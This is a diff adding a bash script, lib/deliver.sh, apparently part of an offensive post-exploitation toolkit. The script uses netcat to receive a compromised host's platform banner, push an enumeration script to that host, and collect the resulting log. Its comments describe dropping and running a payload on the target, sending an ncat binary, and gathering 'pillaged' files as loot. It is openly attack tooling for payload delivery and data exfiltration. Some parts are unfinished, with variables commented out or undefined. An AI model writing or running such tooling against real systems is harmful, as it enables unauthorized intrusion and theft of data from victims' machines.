@@ -1,0 +1,45 @@
+#!/bin/bash
+
+# lib/deliver.sh
+# download and execute payload/drop.sh onto the target host, bourne again shell
+
+# 1. listen for os banner. 
+# 2. send ncat.arch.bin & e.sh.dialect. 
+# 3. listen for e.log. 
+# 4. launch e.shatter.
+
+##############
+# variables
+##############
+
+#ts=$(date +%s)
+#in=incoming
+#mkdir -p $in
+
+##############
+echo [.] [identifying platform...]
+nc -nlp 9999 > $in/$ts.uname
+
+##############
+ip=$(cat $in/$ts.uname |cut -d : -f1)
+uname=$(cat $in/$ts.uname |cut -d : -f2-)
+echo [+] [host] [$ip]
+echo [+] [banner] [$uname]
+
+##############
+# todo: determine kernel, arch,and abi. send precompiled ncat binary and correct shell script dialect
+echo [.] [sending ncat...] [$os $arch $abi]
+##nc -q1 -n $ip 9999 < $payloadDir/$arch/$abi/enum.sh
+echo [.] [sending enum...] [posix]
+cat $payloadDir/cli/$sh/enum.sh |nc -q1 -n $ip 9999
+
+##############
+echo [.] [receiving log...]
+nc -nlp 9999 >$in/$ts.e.log
+logSize=$(ls -sh $in/$ts.e.log |cut -d ' ' -f1)
+echo [+] [received] [$logSize]
+
+##############
+
+# do the folliwing in the loot script's getLoot loop.
+# todo: identify which file is incoming via a keyed header comment line. and, if unknown, as in the case of sending pillaged files, place them in /pillage.
